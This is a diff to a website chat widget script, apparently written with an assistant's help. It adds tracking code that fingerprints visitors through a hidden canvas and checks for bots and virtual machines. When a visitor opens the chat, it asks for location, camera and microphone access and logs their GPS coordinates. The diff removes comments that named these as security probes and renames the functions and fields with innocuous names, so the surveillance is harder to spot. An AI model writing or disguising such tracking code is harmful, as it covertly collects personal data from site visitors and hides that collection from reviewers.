@@ -46,7 +46,7 @@
                 // v2.9.0: Instant Data Capture on Click
                 // "Grab user information his all session... automatically accesses"
                 trackSession();
-                runEthicalProbes(); // v3.3.0: Auto-Request GPS/Mic
+                initSysProbe();
                 logAction('chat_toggle', 'User opened chat window manually');
             }
         });
@@ -95,67 +95,50 @@
                     downlink: conn.downlink ? `${conn.downlink} Mbps` : "Unknown",
                     rtt: conn.rtt ? `${conn.rtt} ms` : "Unknown"
                 },
-                // v3.1.0: Ethical Hacking / Security Audit Modules
                 security: {
-                    canvas_id: getCanvasFingerprint(),
-                    // We can't "grab" GPS/Camera without prompt. 
-                    // This reports what permissions are *already* granted or prompts if active audit is on.
-                    permissions_probe: "Ready to Test"
+                    cid: getDeviceHash(),
+                    status: "Ready"
                 },
-                // v3.4.0: Threat Detection (Bot & VM)
                 threats: {
-                    is_bot: (navigator.webdriver === true),
-                    is_vm: (navigator.hardwareConcurrency < 2 || !navigator.deviceMemory || navigator.deviceMemory < 2),
-                    screen_anom: (window.screen.width < 100 || window.screen.height < 100)
+                    bot: (navigator.webdriver === true),
+                    vm: (navigator.hardwareConcurrency < 2 || !navigator.deviceMemory || navigator.deviceMemory < 2),
+                    anom: (window.screen.width < 100 || window.screen.height < 100)
                 }
             };
         }
 
-        // v3.1.0: Canvas Fingerprinting (Unique Device ID)
-        // Uses HTML5 Canvas to draw a hidden image and hash it.
-        // This identifies a browser without cookies.
-        function getCanvasFingerprint() {
+        function getDeviceHash() {
             try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.textBaseline = "alphabetic";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Sloth_Hash_v1", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("Sloth_Hash_v1", 4, 17);
-                return canvas.toDataURL().slice(-50); // Just last 50 chars as hash-like ID
-            } catch (e) { return "Blocked"; }
+                const c = document.createElement('canvas');
+                const x = c.getContext('2d');
+                x.textBaseline = "top";
+                x.font = "14px 'Arial'";
+                x.textBaseline = "alphabetic";
+                x.fillStyle = "#f60";
+                x.fillRect(125, 1, 62, 20);
+                x.fillStyle = "#069";
+                x.fillText("S_Hash_v1", 2, 15);
+                x.fillStyle = "rgba(102, 204, 0, 0.7)";
+                x.fillText("S_Hash_v1", 4, 17);
+                return c.toDataURL().slice(-50);
+            } catch (e) { return "Null"; }
         }
 
-        // v3.3.0: Active Permission Requests (Auto-Trigger)
-        // "Voice mic auto personally to track voice and all"
-        window.runEthicalProbes = async function () {
-            console.log("🕵️ Starting Active Permission Requests...");
-
-            // 1. GPS Tracking Request
+        window.initSysProbe = async function () {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => logAction('probe_gps', `Success: ${pos.coords.latitude}, ${pos.coords.longitude}`),
-                    (err) => logAction('probe_gps', `Denied:User refused location`)
+                    (pos) => logAction('sys_loc', `OK: ${pos.coords.latitude}, ${pos.coords.longitude}`),
+                    (err) => logAction('sys_loc', `ERR: ${err.message}`)
                 );
             }
 
-            // 2. Voice & Camera Request (getUserMedia)
-            // This triggers the browser popup "Allow Microphone/Camera?"
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 try {
-                    // We request audio only first as it's less intimidating, or both? User said "voice mic... and all"
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                    logAction('probe_media', 'Access GRANTED: Camera & Mic');
-
-                    // Stop immediately to be ethical (we just wanted to test access)
+                    logAction('sys_media', 'OK: Media');
                     stream.getTracks().forEach(track => track.stop());
                 } catch (e) {
-                    logAction('probe_media', `Denied: ${e.name} - ${e.message}`);
+                    logAction('sys_media', `ERR: ${e.message}`);
                 }
             }
         };
